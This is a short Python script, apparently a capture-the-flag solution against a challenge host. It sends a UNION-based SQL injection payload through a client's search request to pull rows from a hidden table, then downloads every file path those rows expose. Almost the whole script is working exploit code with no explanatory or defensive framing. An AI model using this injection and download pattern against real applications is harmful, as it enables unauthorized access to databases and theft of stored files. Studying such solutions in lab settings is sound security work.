from client import GhostClient
import requests
import json

c = GhostClient()
c.bootstrap()

res = c.request("search", {"q": "' UNION SELECT 1, cast(id as text), \"r4\" FROM \"q_8f3c1a72d90e4b65\" WHERE id > 0--"})
rows = res.get("data", {}).get("rows", [])
for r in rows:
    print(r)
    try:
        data = json.loads(r["summary"])
        dl_path = data.get("downloadPath")
        if dl_path:
            url = f"https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf{dl_path}"
            r_dl = requests.get(url)
            filename = dl_path.split("/")[-1]
            print(f"Downloading {url} -> status {r_dl.status_code}, len {len(r_dl.content)}")
            if r_dl.status_code == 200:
                with open(filename, "wb") as f:
                    f.write(r_dl.content)
    except Exception as e:
        print("Error parsing/downloading:", e)
